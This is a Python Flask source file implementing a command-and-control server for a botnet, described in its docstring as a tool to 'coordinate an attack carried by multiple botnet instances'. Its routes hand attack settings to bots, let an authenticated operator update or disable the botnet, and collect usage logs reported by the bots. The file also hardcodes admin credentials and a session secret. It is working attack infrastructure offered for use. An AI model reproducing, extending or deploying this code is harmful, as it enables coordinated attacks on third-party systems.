from flask import Flask
from flask import request
from flask import render_template
from flask import session
from flask import abort
from CCServer import CCServer
from os import urandom

import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime 

app = Flask(__name__)

"""
This is a simple implementation of a micro Command-and-Control Server using Flask. 
Its purpose is to provide a lightweight and simple interface to coordinate an attack carried
by multiple botnet instances, ideally deployed 'round-the-clock'

(please note that in this implementation the server handles just one request at a time - flask default)
"""

# log file path
logPath      = './data/ccserver.log'

# parameters for CC instance
settingsPath = './data/settings.json'
credentialsD = {
    'admin_usr' : "fsociety",
    'admin_pwd' : "steelmountain"
}
# creating CC instance
CC = CCServer(settingsPath, credentialsD)

app.secret_key = "\x9b\x17\xc4\xbc\x11\xed\xdcf\xa1\x9aV\xde\xafR\x93h\x81(\x8f|\xbeE\xd5\x08"



# ROUTING SERVER - settings retrieval 
@app.route('/settings', methods=['GET'])
def getSettings():
    # retrieving settings
    settings = CC.retrieveSettings()
    # logging the request
    app.logger.info("[{0}] => reached by {1} : configuration update required".format(str(datetime.utcnow()), request.remote_addr))

    return settings, 200

@app.route('/', methods=['GET','POST'])
def mainAccess():
    if (request.method == 'POST'):
        return login(request.form['u'],request.form['p'])
    else:
        return render_template("loginpage.html")

def login(username,password):
    if CC.authenticate({'auth_usr': username, 'auth_pwd': password}):
        session['username'] = username
        session['password'] = password
        return render_template("controlpage.html")
    else:
        return abort(403)

# ROUTING SERVER - update settings 
@app.route('/update', methods=['POST'])
def updateSettings():
    # retrieving username and password
    auth = request.authorization
    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings(request.json['settings'])
            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Override succeded", 200
        except TypeError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Bad request, override failure", 400

    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
        return "Forbidden!", 403


# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/logs', methods=['GET'])
def getLog():
    # simply returning log lines from logging file
    # splitting usage info 
    usageinfo = "" 
    logresult = "<h3> C&C SERVER LOGS / {0} </h3> </br>".format(str(datetime.utcnow()))
    
    with open(logPath) as logFile:
        for entry in logFile.readlines():
            if "usage" in entry:
                usageinfo += entry + "</br>"
            else:
                logresult += entry + "</br>"
    
    if len(usageinfo) != 0:
        logresult += "</br></br>"
        logresult += "<h3> USAGE STATS </h3> </br>"
        logresult += usageinfo

    return logresult, 200


# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/botnetlogs', methods=['POST'])
def addBotnetLogs():
    # retrieving from post and formatting entries
    botnet = request.form['botnet']
    log    = request.form['log']
    # polishing log
    if len(log) != 1:
        app.logger.info("[{0}] => reached by botnet {1} - usage: {2}".format(str(datetime.utcnow()), str(botnet), str(log)))
    
    return "OK", 200


# ROUTING SERVER - disable the botnet via C&C
@app.route('/disable', methods=['POST'])
def disableBotnet():
    # retrieving username and password
    auth = request.authorization
    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings({}, enable=False)
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Botnet disabled!", 200
        except KeyError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Bad request, botnet disable failure", 400
    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
        return "Forbidden!", 403


# ---------------------------------------------------------------------#
#                      SERVER START UP ROUTINE                         #
# ---------------------------------------------------------------------#
if __name__ == "__main__": 
    # adding log handler provided by werkzeug lib ... 
    handler = RotatingFileHandler(logPath, maxBytes=10000, backupCount=1)
    # ... but first we need to set log level! 
    handler.setLevel(logging.INFO)
    logging.basicConfig(level=logging.INFO)
    app.logger.addHandler(handler)

    # running server
    app.run()